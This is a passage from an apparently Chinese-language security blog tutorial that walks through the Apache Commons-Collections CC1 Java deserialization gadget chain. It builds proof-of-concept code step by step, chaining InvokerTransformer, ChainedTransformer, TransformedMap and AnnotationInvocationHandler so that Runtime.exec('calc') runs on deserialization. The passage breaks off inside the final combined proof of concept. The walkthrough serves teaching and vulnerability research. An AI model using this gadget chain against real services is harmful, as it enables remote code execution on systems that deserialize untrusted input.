src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE-20250326081028.png"></p><p>跳转到源</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/** The parent map */</span>  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;  </span><br><span class="line">        <span class="built_in">super</span>(entry);  </span><br><span class="line">        <span class="built_in">this</span>.parent = parent;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;  </span><br><span class="line">        value = parent.checkSetValue(value);  </span><br><span class="line">        <span class="keyword">return</span> entry.setValue(value);  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>发现<code>AbstractInputCheckedMapDecorator类</code>下的静态方法MapEntry中的<code>setValue()</code>调用了<code>checkSetValue()</code>。</p><p><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE-20250326090828.png"></p><h4 id="找setValue-触发条件"><a href="#找setValue-触发条件" class="headerlink" title="找setValue()触发条件"></a>找setValue()触发条件</h4><p><strong>接下来我们就需要找到怎么才会主动触发setValue()</strong>,进而触发<code>checkSetValue()</code>方法，这样就可以继续完善POC,来测试这个类和之前的两个类能不能串起来。</p><p>同时发现<code>AbstractInputCheckedMapDecorator类</code>是<code>transformerdMap类</code>的父类；</p><p><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE-20250326085315.png"></p><p>鼠标悬停时，发现<code>AbstractInputCheckedMapDecorator类</code>重写了setValue()方法，它的父类是<code>AbstractMapEntryDecorator类</code>，<br><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE-20250326085252.png"></p><p><strong>transformerdMap类是儿子</strong><br><strong>AbstractInputCheckedMapDecorator类是爸爸</strong><br><strong>AbstractMapEntryDecorator类是爷爷</strong></p><p>跟进<code>AbstractMapEntryDecorator类</code></p><p><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE-20250326090301.png"></p><p>getKey和getValue是返回键值的，setValue是把参数接收的值赋给value,通俗来说就是修改value值。</p><h5 id="setValue-介绍"><a href="#setValue-介绍" class="headerlink" title="setValue()介绍"></a>setValue()介绍</h5><p> <strong><code>setValue()</code> 可以调用的情况</strong></p><ol><li><strong>必须通过 <code>map.entrySet()</code> 获取 <code>Entry</code> 对象(本质是获得map的所有键值对的,entry代表一对键值对)</strong></li><li><strong>不能直接在 <code>Map</code> 上调用 <code>setValue()</code></strong>，因为 <code>Map</code> 本身没有 <code>setValue()</code> 方法</li></ol><p><code>Map.Entry</code> 是 <code>Map</code> 中的<strong>键值对对象</strong>，只有<strong>当 <code>entry</code> 通过 <code>entrySet()</code> 获取时，<code>setValue()</code> 才能被调用</strong></p><p>正确调用 <code>setValue()</code> 的方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;jjxxx&quot;</span>, <span class="string">&quot;value1&quot;</span>);</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 通过 entrySet() 获取 Entry</span></span><br><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : map.entrySet()) &#123;</span><br><span class="line">    <span class="comment">// 这里可以调用 setValue()</span></span><br><span class="line">    entry.setValue(<span class="string">&quot;newValue&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">System.out.println(map.get(<span class="string">&quot;jjxxx&quot;</span>)); </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因此我们知道当遍历map时，就可以主动调用SetValue；完善POC的思路就是新建一个map，传入键值对，让tranformedMap修饰它，然后遍历<code>tranformedMap</code>，调用<code>Setvalue</code>。</p><p>我这里先把poc写出来，详细问题后面介绍</p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC1demo;  </span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;     </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"> </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; TestHashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        TestHashmap.put(<span class="string">&quot;key1&quot;</span>, <span class="string">&quot;value1&quot;</span> );  </span><br><span class="line">        Map&lt;Object, Object&gt; decorateTestHashmap = TransformedMap.decorate(TestHashmap,<span class="literal">null</span>,invokerTransformer);  </span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;Object, Object&gt; entry : decorateTestHashmap.entrySet()) &#123;  </span><br><span class="line">            entry.setValue(runtime);  </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此次POC把反射调用的<code>CheckSetvalue()</code>删除，增加了遍历TransformedMap.decorate装饰的<code>decorateTestHashmap</code>并主动调用<code>SetValue()</code>,从而调用了<code>CheckSetValue()</code>方法。</p><p>命令成功执行说明我们成功把这三个类串了起来，也证明了新加的这个类是可以用的。<br><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE-20250326100128.png"></p><h4 id="parent和value参数问题"><a href="#parent和value参数问题" class="headerlink" title="parent和value参数问题"></a>parent和value参数问题</h4><blockquote><p>这里分析一下POC为什么能执行成功和其中的一些执行细节。</p></blockquote><p>再贴一次源码，方便介绍<br><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE-20250326095141.png"></p><p>源码中<code>value=parent.checkSetValue(value)</code>,涉及了两个参数parent和value</p><h5 id="关于parent"><a href="#关于parent" class="headerlink" title="关于parent"></a><strong>关于parent</strong></h5><blockquote><p>因为<code>MapEntry</code>的构造方法中接受的是<code>AbstractInputCheckedMapDecorator</code>类型的parent，<code>TransformedMap</code>是它的子类，因此传进入的parent参数可以是<code>TransformedMap</code>的。</p></blockquote><p>具体<code>parent.checkSetValue(value)</code>是怎么转换成<code>TransformedMap.checkSetValue(value)</code>的可以调试一下查看是什么情况。</p><p>可以看到我们遍历<code>decorateTestHashmap</code>时，<code>parent</code>的值就会变为<code>TransformedMap</code><br><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE(%E4%B8%80)-20250326114317.png"></p><p>关于该值是怎么传进去的，具体的逻辑流程<a href="https://www.freebuf.com/articles/web/383152.html">shelter</a>中已经很详细介绍了。</p><p><strong>总结一下流程如下：</strong></p><p>遍历<code>decorateTestHashmap</code>（我POC中命名的参数）前，由于<code>TransformedMap</code>没有entrySet()，会找它的父类<code>AbstractInputCheckedMapDecorator</code>的<code>entrySet()</code>，它会调用静态构造器实例化EntrySet类，其中传入的parent参数就是<code>TransformedMap</code>；准备遍历时会把<code>TransformedMap</code>传入<code>EntrySetIterator类</code>中；遍历时会new一个<code>AbstractInputCheckedMapDecorator</code>，同时会把EntrySetlterator类中的parent当作参数传入。</p><h5 id="关于value"><a href="#关于value" class="headerlink" title="关于value"></a>关于value</h5><p>value参数其实是不可控的，后面会具体介绍不可控的详情和解决办法。</p><h4 id="部分流程图-1"><a href="#部分流程图-1" class="headerlink" title="部分流程图"></a>部分流程图</h4><p>继续完善流程图</p><p><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE(%E4%B8%80)-20250326150206.png"></p><h3 id="头部AnnotationInvocationHandler"><a href="#头部AnnotationInvocationHandler" class="headerlink" title="头部AnnotationInvocationHandler"></a>头部AnnotationInvocationHandler</h3><blockquote><p>从上文我们知道，<code>setValue</code>可以在遍历map时调用，我们上方的poc是主动调用的setValue,因此我们的下一步就是找到一个能够调用setValue的类。</p></blockquote><p>还是老样子右键查看用法，找符合条件的类<br>发现<code>AnnotationInvocationHandler类</code>的<code>readobject()</code>方法调用了<code>setValue()</code>方法，这个类可以说是一举两得，找到<code>setValue()</code>的同时还把<code>readobject()</code>入口点找到了；也符合可序列化和重写readobject方法。<br><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE(%E4%B8%80)-20250326155115.png"></p><p>查看方法，发现for循环接收一个<code>memberValues</code>，最终变为<code>memberValue.setValue</code>，翻翻这个参数从哪里来；同时我们看到了要调用setValue方法，需要绕过两个if条件，并且setvalue里面的参数也是不可控的，我们最后需要绕过这些。<br><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE(%E4%B8%80)-20250326150643.png"></p><p>在该类的构造方法中看到接收的参数，注解类型的type和Map类型的<code>memberValues</code>；同时它的作用域为Defalult,那么调用时就需要反射调用了。<br><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE(%E4%B8%80)-20250326151335.png"></p><p>接下来写POC的思路就是用反射调用该类的的构造方法，让它触发setvalue方法，这里的话先写一个poc的草稿，后续遇到问题会继续修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC1demo;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;   </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Class.forName;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;   </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; TestHashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        TestHashmap.put(<span class="string">&quot;key1&quot;</span>, <span class="string">&quot;value1&quot;</span> );  </span><br><span class="line">        Map&lt;Object, Object&gt; decorateTestHashmap = TransformedMap.decorate(TestHashmap,<span class="literal">null</span>,invokerTransformer);  </span><br><span class="line">        <span class="keyword">final</span> Class&lt;?&gt; aClass = forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> aClass.getDeclaredConstructor(Class.class, Map.class);  </span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">result1</span> <span class="operator">=</span> constructor.newInstance(Override.class, decorateTestHashmap);  </span><br><span class="line">        ser(result1);  </span><br><span class="line">        unser(<span class="string">&quot;ser.bin&quot;</span>); </span><br><span class="line">  </span><br><span class="line">  <span class="comment">//新增序列化和反序列化  </span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ser</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unser</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这就是我们写好的POC草稿，它现在运行肯定是没办法成功执行命令的。</p><h2 id="三个问题"><a href="#三个问题" class="headerlink" title="三个问题"></a>三个问题</h2><blockquote><p>因为我们还有三个问题没有解决：<br>第一，Runtime类是没法序列化的<br>第二，两个if条件还没有绕过，否则无法调用setValue<br>第三，setValue内的值不可控</p></blockquote><h3 id="Runtime序列化问题"><a href="#Runtime序列化问题" class="headerlink" title="Runtime序列化问题"></a>Runtime序列化问题</h3><p><code>Runtime</code> <strong>没有实现 <code>Serializable</code>，因此不能直接被序列化</strong>。<code>Runtime.class</code> <strong>本质上是 <code>Class</code> 类的一个实例</strong>，它可以序列化，我们可以通过反射调用<code>Runtime.class</code>。</p><p>先用普通反射写一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;Runtime&gt; runtimeClass = Runtime.class;  </span><br><span class="line"><span class="type">Method</span> <span class="variable">getruntime</span> <span class="operator">=</span> runtimeClass.getMethod(<span class="string">&quot;getRuntime&quot;</span>);  </span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) getruntime.invoke(<span class="literal">null</span>,<span class="literal">null</span>);  </span><br><span class="line"><span class="type">Method</span> <span class="variable">execmethod</span> <span class="operator">=</span>runtimeClass.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);  </span><br><span class="line">execmethod.invoke(runtime,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>然后再用<code>InvokerTransformer</code>的方式把它写出来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Method getruntime=(Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class); </span><br><span class="line"><span class="comment">//先获取getMethod方法，getMethod接收参数的类型为String.class和Class[].class，如果不知道类型可以ctrl+左键跳转到实现getMethod的构造方法查看，然后就是getMethod接受的参数值为getRuntime</span></span><br><span class="line"><span class="comment">//后两条一样，就解读了。</span></span><br><span class="line"></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span>   <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(getruntime);  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(runtime);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>写出来之后 ，我们发现其实第一个<code>InvokerTransformer</code>得到的结果就是下一个<code>InvokerTransformer.transform</code>接收的参数。</p><h4 id="ChainedTransformer辅助类"><a href="#ChainedTransformer辅助类" class="headerlink" title="ChainedTransformer辅助类"></a>ChainedTransformer辅助类</h4><p>这时候就可以利用我们前置知识提到的<code>ChainedTransformer类</code>，详情前置知识已经讲了，直接利用它修改一下上方代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">&#125;;  </span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">chainedTransformer.transform(Runtime.class);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E01%E7%AF%87Commons-Collections%E4%B9%8BCC1%E9%93%BE(%E4%B8%80)-20250326174441.png"></p><p>再把它前面的poc草稿结合一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC1demo;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;   </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Class.forName;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;   </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">&#125;;  </span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);    </span><br><span class="line">        HashMap&lt;Object, Object&gt; TestHashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        TestHashmap.put(<span class="string">&quot;key1&quot;</span>, <span class="string">&quot;value1&quot;</span> );  </span><br><span class="line">        Map&lt;Object, Object&gt; decorateTestHashmap = TransformedMap.decorate(TestHashmap,<span class="literal">null</span>,chainedTransformer);  </span><br><span class="line">        <span class="keyword">final</span> Class&lt;?&gt; aClass = forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> aClass.getDeclaredConstructor(Class.class, Map.class);  </span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">result1</span> <span class="operator">=</span> constructor.newInstance(Override.class, decorateTestHashmap);  </span><br><span class="line">        ser(result1);  </span><br><span class="line">        unser(<span class="string">&quot;ser.bin&quot;</span>); </span><br><span class="line">  